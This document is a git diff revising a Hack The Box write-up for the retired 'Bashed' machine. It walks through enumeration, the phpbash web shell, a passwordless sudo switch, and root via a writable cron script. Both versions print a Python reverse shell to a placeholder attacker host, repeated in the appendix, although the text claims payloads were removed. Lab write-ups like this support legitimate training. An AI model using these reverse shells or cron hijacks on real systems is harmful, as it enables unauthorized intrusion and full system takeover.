@@ -1,308 +1,160 @@
-\# Hack The Box: Bashed \*(Retired)\*
+# Hack The Box: Bashed (Retired)
 
-
-
-\- \*\*Target:\*\* `Bashed`
-
-\- \*\*Date Completed:\*\* September 16, 2025
-
-\- \*\*Difficulty:\*\* Easy \*(felt medium as first box)\*
-
-\- \*\*Flags:\*\*
-
-&nbsp; - User: `<user-flag>`
-
-&nbsp; - Root: `<root-flag>`
-
-
-
-> 📝 \*\*Note\*\*: This writeup is for the retired Hack The Box machine `Bashed`. All content is for educational purposes in authorized lab environments only. IPs and flags are redacted to comply with HTB’s Terms of Service.
-
-
+- **Target:** Bashed  
+- **Difficulty:** Easy (felt medium as first box)  
+- **Date Completed:** September 16, 2025  
+- **Notes:** All sensitive info redacted to comply with HTB Terms of Service.  
+- **Tags:** #HTB #OSCP #PrivilegeEscalation #CronJobs #pspy #WebShell #Linux
 
 ---
 
+## Initial Enumeration
 
-
-\## 🔍 Initial Enumeration
-
-
-
-\### Nmap
-
-
+### 1. Nmap Scan
 
 nmap -sC -sV -p- --min-rate=1000 <target-ip>
-
 Open port: 80/tcp
-
-
 
 Service: Apache HTTPD 2.4.18 (Ubuntu)
 
+HTTP Title: Arrexel's Development Site
+
+Noticed a GitHub link on the site: https://github.com/Arrexel/phpbash
+
+### 2. Web Discovery & Directory Enumeration
+Accessed the site and explored links.
+
+Used gobuster for directory brute-forcing:
 
 
-Site Title: Arrexel's Development Site
+gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-common.txt
+Found interesting directories: /dev, /php, /uploads (others seemed generic).
 
+/dev gave HTTP 301 but was accessible via browser.
 
-
-\### Web Discovery
-
-Visited: http://<target-ip>
-
-Added IP and redirected search domain to /etc/hosts file
-
-Found GitHub link: https://github.com/Arrexel/phpbash
-
-
-
-\### Directory Enumeration (Gobuster)
-
-
-
-gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html -o gobuster.txt
-
-
-
-Interesting directories:
-
-
-
-/dev/
-
-
-
-/uploads/
-
-
-
-/php/
-
-
-
-Finding the Shell =>
-
-Discovered working shell at:
-
+Located the semi-interactive web shell at:
 http://<target-ip>/dev/phpbash.php
 
+Note: phpbash is a lightweight web shell for penetration testing (found on GitHub linked from the dev site).
+
+## Foothold -  Web Shell Access
+Accessed the web shell as www-data:
+
+$whoami
+www-data
+
+$id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ls -lha /home
+Found users: arrexel, scriptmanager, root
+Explored user directories: suspected user flags would be in /home/arrexel or /home/scriptmanager.
 
 
-\## Foothold (Web Shell)
+## User Flag Capture
+Navigated to /home/arrexel:
 
-Accessed semi-interactive web shell as www-data
+$cat /home/arrexel/user.txt
+User flag captured: (redacted)
 
-
-
-Basic Enumeration
-
-whoami
-
-id
-
-ls -la
-
-ls -lha /home
-
-cat /etc/passwd
+## Privilege Escalation
+1. Initial Checks
+Checked sudo permissions:
+$sudo -l
+# As www-data, can run commands as user scriptmanager without password
+Switched user to scriptmanager:
 
 
-
-Discovered users:
-
-arrexel
-
+$sudo -u scriptmanager /bin/bash
+$whoami
 scriptmanager
+$sudo -l
+scriptmanager requires password; no root permissions granted.
 
+2. Cronjob Enumeration with pspy
+Downloaded and ran pspy64 to monitor cron jobs in real time.
 
+Reverse Shell from Target Machine:
+$uname -a
+Target machine has 64 bit OS. Hence download PSPY64
+$which curl
+curl not available in target machine
+$which wget
+wget available. Hence using wget to download PSPY64 from attacker machine
 
-\## Shell Upgrade (TTY)
+Attacker machine Terminal:
+$wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
+Set the HTTP server running in attacker side
+$python -m http.server 8000
 
-Improved shell usability:
+Reverse Shell from Target Machine:
+$wget http://$Attacker_IP:8000/pspy64 -O pspy64
+$./pspy64
 
+Discovered:
 
+Cron runs /scripts/test.py as root every minute.
 
-Initiate Netcat listener in Attacker machine
+/scripts directory is writable.
 
-nc -lnvp port
+test.py creates/overwrites test.txt with root privileges.
 
-
-
-Used Reverse Shell script from Pentest Monkey cheat sheet in the obtained webshell
-
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$IP",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(\["/bin/bash"])'
-
-
-
-Executed the below commands in attacker machine to make the shell interactive and better
-
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-
-
-Ctrl+Z (background shell)
-
-stty raw -echo
-
-fg (foreground the listener shell)
-
-export TERM=xterm
-
-
-
-\## User Flag Access
-
-Switched to arrexel's home directory:
-
-
-
-cat /home/arrexel/user.txt
-
-✅ User Flag: <user-flag-captured>
-
-
-
-\## Privilege Escalation
-
-
-
-\### Know about current user's permission
-
-sudo -l 
-
-Switching User to scriptmanager user as it requires NO PASSWORD
-
-Successfully switched to scriptmanager without password:
-
-
-
-sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-
-
-\### Enumerating Scriptmanager user
-
-ls -la
-
-ls -ls /home
-
-id
-
-groups
-
-checking for permissions
-
-find / -perm -4000 -type f 2>/dev/null
-
-find / -perm -2000 -type f 2>/dev/null
-
-
-
-sudo -l ==> requires password for Scriptmanager profile
-
-cat /etc/crontab
-
-ls -la /etc/cron\*
-
-ps aux | grep cron
-
-
-
-\### Cronjob Enumeration with pspy
-
-Downloaded and ran pspy64.
-
-
-
-Observations:
-
-Cron runs /scripts/test.py as root every minute
-
-
-
-/Scripts folder and test.py is world-writable
-
-
-
-It generates a test.txt file with root permissions / admin rights — evidence of execution
-
-
-
-\### Exploiting Cronjob for Root Shell
-
-Replaced test.py with reverse shell:
-
+3. Exploiting Cron for Root Shell
+Edited /scripts/test.py to include a reverse shell payload (Python):
 
 
 import socket, subprocess, os
-
 s = socket.socket()
-
 s.connect(("<attacker-ip>", <port>))
-
 os.dup2(s.fileno(), 0)
-
 os.dup2(s.fileno(), 1)
-
 os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/bash"])
+Set up nc -lvnp <port> listener on attacker machine.
 
-subprocess.call(\["/bin/bash"])
+After cron ran the modified script, got a root shell.
 
-
-
-Started listener:
-
-nc -lvnp <port>
-
-
-
-Got reverse shell as root
-
-
-
-\## Root Flag Access
-
-Switched to root home directory:
-
+## Root Flag Capture
+Accessed root directory:
 
 
 cd /root
-
 cat root.txt
+Root flag captured: (redacted)
 
-✅ Root Flag: <root-flag-captured>
+## Learnings & Reflections
+Web shells like phpbash can give powerful footholds.
 
+sudo -u <user> without a password can be a privilege escalation path.
 
+pspy is invaluable for real-time cron/job enumeration.
 
-\## Learnings \& Reflections
+Writable root cron scripts are critical escalation vectors.
 
-Key Takeaways:
+Upgrading shells with Python pty.spawn makes interaction easier.
 
-Got hands-on with cronjob-based privilege escalation
+Always check cronjobs and scripts for abuse opportunities in Linux pentesting.
 
+⚠️ Note: All IPs, flags, and direct exploit payloads have been removed or redacted to comply with Hack The Box's Terms of Service and responsible disclosure guidelines.
 
+Appendix
+Useful Commands Summary
+Nmap scan:
+nmap -sC -sV -p- --min-rate=1000 <target-ip>
 
-Learned to use pspy for live process monitoring
+Gobuster directory enumeration:
+gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 
+Switch user without password:
+sudo -u scriptmanager /bin/bash
 
-
-Practiced switching users with sudo -u (no password required)
-
-
-
-Learned to upgrade shells with Python’s pty.spawn
-
-
-
-Gained first experience working with web shells like phpbash
-
-
-
-Reverse engineering the python script and observing UID, profiles and permissions with which the .py scripts and output files are generated
-
-
-
-📎 Tags
-
-\#HTB #OSCP #PrivilegeEscalation #CronJobs #pspy #WebShell #Writeup #Linux
-
+Reverse shell python payload for cron job (replace IP and port):
+import socket, subprocess, os
+s = socket.socket()
+s.connect(("<attacker-ip>", <port>))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/bash"])
+Tags
+#HTB #OSCP #WebShell #PrivilegeEscalation #CronJobs #pspy #Linux #Writeup
